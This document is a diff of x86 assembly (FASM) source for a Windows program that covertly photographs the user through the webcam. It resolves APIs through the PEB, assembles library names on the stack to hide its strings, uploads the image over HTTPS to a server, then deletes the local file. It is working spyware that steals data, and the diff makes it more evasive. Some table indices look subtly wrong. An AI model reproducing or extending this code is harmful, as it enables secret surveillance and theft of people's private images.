@@ -30,31 +30,49 @@
 
 format PE GUI 4.0
 entry start
+include 'MACRO/STRUCT.inc'
+
+struct FUNC
+        name rb 30
+        addr dd ?
+ends
 
 MAX_SIZE = 2024
 
 section '.rdata' data readable
-        luser    db 'user32.dll', 0
-        lavicap  db 'avicap32.dll', 0
-        lwininet db 'wininet.dll', 0
+        kernel32 dd ?
+        GetProcAddress dd ?
 
-        sleep    db 'Sleep', 0
-        createF  db 'CreateFileA', 0
-        readF    db 'ReadFile', 0
-        delfile  db 'DeleteFileA', 0
+        kernelTable:
+                FUNC 'LoadLibraryA', 0
+                FUNC 'Sleep', 0
+                FUNC 'CloseHandle', 0
+                FUNC 'CreateFileA', 0
+                FUNC 'ReadFile', 0
+                FUNC 'DeleteFileA', 0
+                FUNC 'ExitProcess', 0
+        kernelTable.count = 7
 
-        inetOpen db 'InternetOpenA', 0
-        inetCon  db 'InternetConnectA', 0
-        httpOpen db 'HttpOpenRequestA', 0
-        httpSend db 'HttpSendRequestA', 0
-        intClose db 'InternetCloseHandle', 0
-        inetOpt  db 'InternetSetOptionA', 0
+        user32 dd ?
+        
+        userTable:
+                FUNC 'SendMessageA', 0
+        userTable.count = 1
 
-        closeh   db 'CloseHandle', 0
-        loadLib  db 'LoadLibraryA', 0
-        sendMes  db 'SendMessageA', 0
-        capCap   db 'capCreateCaptureWindowA', 0
-        exitProc db 'ExitProcess', 0
+        wininet dd ?
+        wininetTable:
+                FUNC 'InternetOpenA', 0
+                FUNC 'InternetConnectA', 0
+                FUNC 'HttpOpenRequestA', 0
+                FUNC 'HttpSendRequestA', 0
+                FUNC 'InternetCloseHandle', 0
+                FUNC 'InternetSetOptionA', 0
+        wininetTable.count = 6
+
+        avicap dd ?
+        avicapTable:
+                FUNC 'capCreateCaptureWindowA', 0
+        avicapTable.count = 1
 
         capWin   db '4B4DB4B3', 0
 
@@ -65,32 +83,9 @@ section '.rdata' data readable
         _filename  db 'C:\\Users\\cheese.bmp', 0
 
 section '.data' data readable writeable
-        user32  dd   ?
-        avicap  dd   ?
-        wininet dd   ?
-
         hOpen   dd ?
         hCon    dd ?
         hReq    dd ?
-
-        CloseHandle            dd ?
-        DeleteFile             dd ?
-        InternetOpen           dd ?
-        InternetConnect        dd ?
-        HttpOpenRequest        dd ?
-        HttpSendRequest        dd ?
-        InternetCloseHandle    dd ?
-        InternetSetOption      dd ?
-
-        capCreateCaptureWindow dd ?
-        SendMessage dd ?
-
-        Sleep          dd ?
-        CreateFile     dd ?
-        ReadFile       dd ?
-        LoadLibrary    dd ?
-        GetProcAddress dd ?
-        ExitProcess    dd ?
 
         text            rb MAX_SIZE
         bytesReaded     dd ?
@@ -100,7 +95,232 @@ section '.data' data readable writeable
         hWebcam         dd ?
 
 section '.code' code readable executable
-        start:
+        start:  call init
+;  ____________________________________________________________
+; |                                                            |
+; |                    KERNEL32 INIT                           |
+; |____________________________________________________________|
+                push kernelTable
+                push kernelTable.count
+                push [kernel32]
+                call initFunctions
+
+;  ____________________________________________________________
+; |                                                            |
+; |                    Load other libraries                    |
+; |____________________________________________________________|
+                push 0
+                push 'll00'
+                sub word[esp+0x2], '0'
+                push '32.d'
+                push 'user'
+                push esp
+                call [kernelTable+FUNC.addr]
+                test eax, eax
+                jz exit
+
+                mov [user32], eax
+
+                push 0
+                push 'dll0'
+                sub word[esp+0x3], '0'
+                push 'net.'
+                push 'wini'
+                push esp
+                call [kernelTable+FUNC.addr]
+
+                mov [wininet], eax
+
+                push 0
+                push '.dll'
+                push 'ap32'
+                push 'avic'
+                push esp
+                call [kernelTable+FUNC.addr]
+                test eax, eax
+                jz exit
+
+                mov [avicap], eax
+;  ____________________________________________________________
+; |                                                            |
+; |                    Other libaries init                     |
+; |____________________________________________________________|
+                push userTable
+                push userTable.count
+                push [user32]
+                call initFunctions
+
+                push wininetTable
+                push wininetTable.count
+                push [wininet]
+                call initFunctions
+
+                push avicapTable
+                push avicapTable.count
+                push [avicap]
+                call initFunctions
+;  ____________________________________________________________
+; |                                                            |
+; |                    Main code start                         |
+; |                   Get photo from camera                            |
+; |____________________________________________________________|
+
+                push 0
+                push 0
+                push 500
+                push 500
+                push 10
+                push 10
+                push 0
+                push capWin
+                call [avicapTable+FUNC.addr]
+                mov [hWebcam], eax
+
+                push 0
+                push 0
+                push 0x0400 + 10
+                push [hWebcam]
+                call [userTable+FUNC.addr]
+
+                push 0
+                push 0
+                push 0x400 + 53
+                push [hWebcam]
+                call [userTable+FUNC.addr]
+
+                push _filename
+                push 0
+                push 0x400 + 25
+                push [hWebcam]
+                call [userTable+FUNC.addr]
+
+                push 0
+                push 0
+                push 0x400 + 11
+                push [hWebcam]
+                call [userTable+FUNC.addr]
+
+                push 2000
+                call [kernelTable+1*sizeof.FUNC+FUNC.addr]
+
+                push [hWebcam]
+                call [kernelTable+2*sizeof.FUNC+FUNC.addr]
+
+                push 0
+                push 0
+                push 3
+                push 0
+                push 0x00000001
+                push 0x80000000
+                push _filename
+                call [kernelTable+3*sizeof.FUNC+FUNC.addr]
+                mov [hFile], eax
+                test eax, eax
+                jz exit
+
+                push 0
+                push bytesReaded
+                push 1024
+                push text
+                push [hFile]
+                call [kernelTable+4*sizeof.FUNC+FUNC.addr]
+                cmp eax, 1
+                jne exit
+
+;  ____________________________________________________________
+; |                                                            |
+; |             Sending photo from camera                      |
+; |____________________________________________________________|
+
+                push 0
+                push 0
+                push 42
+                push 0
+                call [wininetTable+6*sizeof.FUNC+FUNC.addr]
+
+                push 0
+                push 0
+                push 0
+                push 0
+                push capWin
+                call [wininetTable+FUNC.addr]
+                mov [hOpen], eax
+
+                push 0
+                push 0
+                push 3
+                push 0
+                push 0
+                push 443
+                push server
+                push [hOpen]
+                call [wininetTable+1*sizeof.FUNC+FUNC.addr]
+                mov [hCon], eax
+
+                push 0
+                push 0x00800000 or 0x80000000
+                push accType
+                push 0
+                push 0
+                push 0
+                push verb
+                push [hCon]
+                call [wininetTable+2*sizeof.FUNC+FUNC.addr]
+                mov [hReq], eax
+
+
+                push MAX_SIZE
+                push text
+                push 0
+                push 0
+                push [hReq]
+                call [wininetTable+3*sizeof.FUNC+FUNC.addr]
+
+        exit:
+                push [hOpen]
+                call [wininetTable+4*sizeof.FUNC+FUNC.addr]
+
+                push [hCon]
+                call [wininetTable+4*sizeof.FUNC+FUNC.addr]
+
+                push [hReq]
+                call [wininetTable+4*sizeof.FUNC+FUNC.addr]
+
+                push [hFile]
+                call [kernelTable+2*sizeof.FUNC+FUNC.addr]
+
+                push _filename
+                call [kernelTable+5*sizeof.FUNC+FUNC.addr]
+                push 0
+                call [kernelTable+6*sizeof.FUNC+FUNC.addr]
+                ret
+
+
+        initFunctions:
+                xor esi, esi
+        startInit:
+                cmp esi, [esp+8]
+                je functionsEndInit
+
+                mov ebx, [esp+12]
+                mov edx, esi
+                imul edx, sizeof.FUNC
+                add ebx, edx
+
+                mov eax, [esp+4]
+                push ebx
+                push eax
+                call [GetProcAddress]
+
+                mov [ebx+FUNC.addr], eax
+
+                inc esi
+                jmp startInit
+
+        functionsEndInit:
+                ret
+
+        init:
                 mov edi, [fs:0x030]
                 mov edi, [edi + 0x00c]
                 mov edi, [edi + 0x014]
@@ -108,12 +328,16 @@ section '.code' code readable executable
                 mov edi, [edi + 0x00]
                 mov edi, [edi + 0x10]
 
+                mov [kernel32], edi
+
                 mov edx, [edi + 0x3c]
                 add edx, edi
                 mov edx, [edx + 0x78]
                 add edx, edi
                 mov esi, [edx + 0x20]
                 add esi, edi
+                xor ecx, ecx
+
                 xor ecx, ecx
 
         searchProcAddr:
@@ -138,217 +362,4 @@ section '.code' code readable executable
                 add edx, edi
                 mov [GetProcAddress], edx
 
-                push loadLib
-                push edi
-                call [GetProcAddress]
-                mov [LoadLibrary], eax
-
-                push sleep
-                push edi
-                call [GetProcAddress]
-                mov [Sleep], eax
-
-                push readF
-                push edi
-                call [GetProcAddress]
-                mov [ReadFile], eax
-
-                push createF
-                push edi
-                call [GetProcAddress]
-                mov [CreateFile], eax
-
-                push closeh
-                push edi
-                call [GetProcAddress]
-                mov [CloseHandle], eax
-
-                push delfile
-                push edi
-                call [GetProcAddress]
-                mov [DeleteFile], eax
-
-                push exitProc
-                push edi
-                call [GetProcAddress]
-                mov [ExitProcess], eax
-
-                push luser
-                call [LoadLibrary]
-                mov [user32], eax
-
-                push sendMes
-                push [user32]
-                call [GetProcAddress]
-                mov [SendMessage], eax
-
-
-                push lavicap
-                call [LoadLibrary]
-                mov [avicap], eax
-
-                push capCap
-                push [avicap]
-                call [GetProcAddress]
-
-                mov [capCreateCaptureWindow], eax
-
-                push 0
-                push 0
-                push 500
-                push 500
-                push 10
-                push 10
-                push 0
-                push capWin
-                call [capCreateCaptureWindow]
-                mov [hWebcam], eax
-
-                push 0
-                push 0
-                push 0x0400 + 10
-                push [hWebcam]
-                call [SendMessage]
-
-                push 0
-                push 0
-                push 0x400 + 53
-                push [hWebcam]
-                call [SendMessage]
-
-                push _filename
-                push 0
-                push 0x400 + 25
-                push [hWebcam]
-                call [SendMessage]
-
-                push 0
-                push 0
-                push 0x400 + 11
-                push [hWebcam]
-                call [SendMessage]
-
-                push 2000
-                call [Sleep]
-
-                push [hWebcam]
-                call [CloseHandle]
-
-                push 0
-                push 0
-                push 3
-                push 0
-                push 0x00000001
-                push 0x80000000
-                push _filename
-                call [CreateFile]
-                mov [hFile], eax
-                test eax, eax
-                jz exit
-
-                push 0
-                push bytesReaded
-                push 1024
-                push text
-                push [hFile]
-                call [ReadFile]
-                cmp eax, 1
-                jne exit
-
-
-                push lwininet
-                call [LoadLibrary]
-                mov [wininet], eax
-
-                push inetOpen
-                push [wininet]
-                call [GetProcAddress]
-                mov [InternetOpen], eax
-
-                push inetCon
-                push [wininet]
-                call [GetProcAddress]
-                mov [InternetConnect], eax
-
-                push httpOpen
-                push [wininet]
-                call [GetProcAddress]
-                mov [HttpOpenRequest], eax
-
-                push httpSend
-                push [wininet]
-                call [GetProcAddress]
-                mov [HttpSendRequest], eax
-
-                push intClose
-                push [wininet]
-                call [GetProcAddress]
-                mov [InternetCloseHandle], eax
-
-                push inetOpt
-                push [wininet]
-                call [GetProcAddress]
-                mov [InternetSetOption], eax
-
-                push 0
-                push 0
-                push 42
-                push 0
-                call [InternetSetOption]
-
-                push 0
-                push 0
-                push 0
-                push 0
-                push capWin
-                call [InternetOpen]
-                mov [hOpen], eax
-
-                push 0
-                push 0
-                push 3
-                push 0
-                push 0
-                push 443
-                push server
-                push [hOpen]
-                call [InternetConnect]
-                mov [hCon], eax
-
-                push 0
-                push 0x00800000 or 0x80000000
-                push accType
-                push 0
-                push 0
-                push 0
-                push verb
-                push [hCon]
-                call [HttpOpenRequest]
-                mov [hReq], eax
-
-
-                push MAX_SIZE
-                push text
-                push 0
-                push 0
-                push [hReq]
-                call [HttpSendRequest]
-
-        exit:
-                push [hOpen]
-                call [InternetCloseHandle]
-
-                push [hCon]
-                call [InternetCloseHandle]
-
-                push [hReq]
-                call [InternetCloseHandle]
-
-                push [hFile]
-                call [CloseHandle]
-
-                push _filename
-                call [DeleteFile]
-                push 0
-                call [ExitProcess]
                 ret
